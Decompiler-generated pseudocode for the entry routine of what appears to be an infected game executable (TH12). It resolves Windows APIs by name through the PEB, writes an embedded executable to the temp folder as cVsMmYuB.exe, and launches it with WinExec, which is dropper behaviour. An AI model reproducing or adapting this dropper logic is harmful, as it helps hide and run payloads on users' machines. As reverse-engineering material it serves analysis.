// AUTOMATIC PSEUDOCODE: NOT ORIGINAL SOURCE OR VERIFIED BEHAVIOR
// TH12 1.00b 0x4d9000; EXE 99907258b44ea25be41fb4e607cbe7f64b79021148d9fb95a9a7ebf979095417; angr 10.0.1.post1
// Inferred types/register conventions/x87 expressions require assembly review.

typedef struct PEB_LDR_DATA {
    Byte Reserved1[8];
    void* Reserved2[3];
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA;

typedef struct PEB {
    Byte Reserved1[2];
    Byte BeingDebugged;
    Byte *Reserved2;
    void* Reserved3[2];
    struct PEB_LDR_DATA *Ldr;
    struct RTL_USER_PROCESS_PARAMETERS *ProcessParameters;
    void* Reserved4[3];
    void* AtlThunkSListPtr;
    void* Reserved5;
    unsigned int Reserved6;
    void* Reserved7;
    unsigned int Reserved8;
    unsigned int AtlThunkSListPtr32;
    void* Reserved9[45];
    Byte Reserved10[96];
    Void (*PostProcessInitRoutine)(void);
    Byte Reserved11[128];
    void* *Reserved12;
    unsigned int SessionId;
} PEB;

typedef struct st_4d9000_0 {
    char padding_0[60];
    unsigned int field_3c;
} st_4d9000_0;

typedef struct RTL_USER_PROCESS_PARAMETERS {
    Byte Reserved1[16];
    void* Reserved2[10];
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS;

typedef struct LIST_ENTRY {
    struct LIST_ENTRY *Flink;
    struct LIST_ENTRY *Blink;
} LIST_ENTRY;

typedef struct UNICODE_STRING {
    unsigned short Length;
    unsigned short MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING;

extern unsigned int g_41656c;
extern unsigned int g_4d9269;

unsigned int _start(void)
{
    unsigned int v21;  // ebx
    unsigned int v22;  // esi
    unsigned int v31;  // ecx
    unsigned int v32;  // esi
    int v33;  // ecx
    unsigned int v23;  // edi
    st_4d9000_0 *v24;  // eax
    unsigned int *idx;  // ecx
    unsigned int v26;  // esi
    unsigned int index;  // edx
    unsigned int v28;  // edx
    unsigned int v29;  // ecx
    unsigned int *v30;  // esi
    unsigned int v0;  // [bp-0x17c]
    unsigned int v1;  // [bp-0x178]
    unsigned int v2;  // [bp-0x174]
    char v3;  // [bp-0x170]
    char v4[12];  // [bp-0x6c]
    unsigned int v5;  // [bp-0x60]
    char v6[20];  // [bp-0x4c]
    unsigned int v7;  // [bp-0x38]
    unsigned int v8;  // [bp-0x34]
    char v9;  // [bp-0x30]
    PEB *ch;  // [bp-0x2c]
    unsigned int *v11;  // [bp-0x28]
    unsigned int *v12;  // [bp-0x24]
    unsigned int v13;  // [bp-0x20]
    unsigned int *v14;  // [bp-0x1c]
    unsigned int *v15;  // [bp-0x18]
    unsigned int *v16;  // [bp-0x14]
    unsigned int *v17;  // [bp-0x10]
    unsigned int *v18;  // [bp-0xc]
    unsigned int *iter;  // [bp-0x8]

    v2 = v21;
    v1 = v22;
    v0 = v23;
    v11 = NULL;
    v16 = NULL;
    v15 = NULL;
    v18 = NULL;
    v17 = NULL;
    v12 = NULL;
    v14 = NULL;
    strncpy(v6, "cVsMmYuB.exe", 16);
    iter = &g_4d9269;
    ch = NtGetCurrentPeb();
    *(iter) = 3909403779;
    iter[1] = 0xfff955ac;
    v24 = *((int *)(*((int *)(int)(ch->Reserved3[1])[28]) + 8));
    while (1)
    {
        idx = &v24->padding_0[*((int *)&v24[1].padding_0[56 + v24->field_3c])];
        v26 = &v24->padding_0[idx[9]];
        index = 0;
        v8 = v26;
        v13 = 0;
        v7 = idx[6];
        while (1)
        {
            if (index < v7)
            {
                v28 = &v24->padding_0[*((int *)&v24->padding_0[4 * index + idx[8]])];
                v29 = *((int *)v28);
                v30 = &v24->padding_0[*((int *)&v24->padding_0[4 * *((short *)(v26 + index * 2)) + idx[7]])];
                if (v29 == 1299473735 && *((int *)(v28 + 4)) == 1819632751 && *((int *)(v28 + 8)) == 1851869285 && *((int *)(v28 + 12)) == 1097165924 && !*((char *)(v28 + 16)))
                {
                    if (!v11)
                    {
                        v5 = 0;
                        v11 = v30;
                        strncpy(v4, "Kernel32.dll", 12);
                        v24 = v30(v4);
                        break;
                    }
                }
                else
                {
                    if (v29 == 1164863831 && *((int *)(v28 + 4)) == 6514040)
                    {
                        v17 = v30;
                    }
                    else if (v29 == 1936682051 && *((int *)(v28 + 4)) == 1851869285 && *((int *)(v28 + 8)) == 6646884)
                    {
                        v18 = v30;
                    }
                    else if (v29 == 1953067607 && *((int *)(v28 + 4)) == 1818838629 && *((short *)(v28 + 8)) == 101)
                    {
                        v15 = v30;
                    }
                    else
                    {
                        v31 = *((int *)v28);
                        if (v31 == 1634038339 && *((int *)(v28 + 4)) == 1766221172 && *((int *)(v28 + 8)) == &g_41656c)
                        {
                            v16 = v30;
                        }
                        else if (v31 == 1416914247 && *((int *)(v28 + 4)) == 1349545317 && *((int *)(v28 + 8)) == 1097364577)
                        {
                            v12 = v30;
                        }
                        else if (v31 == 1920234348 && *((int *)(v28 + 4)) == 1098146147)
                        {
                            v14 = v30;
                        }
                    }
                }
                if (v11 && v16 && v15 && v18 && v17 && v12 && v14)
                    goto LABEL_4d91ee;
                v13 += 1;
                v26 = v8;
                index = v13;
            }
            else
            {
LABEL_4d91ee:
                v12(260, &v3);
                v14(&v3, v6);
                v32 = v16(&v3, 0xc0000000, 0, 0, 2, 128, 0);
                if (v32 == 0xffffffff)
                    return v32;
                v33 = 0;
                do
                {
                    if (*(iter) == 9460301)
                    {
                        v15(v32, iter, 0x3e00, &v9, 0);
                        break;
                    }
                } while ((iter += 1, v33 = (int)(v33 + 1), v33 < 500));
                v18(v32);
                return v17(&v3, 5);
            }
        }
    }
}
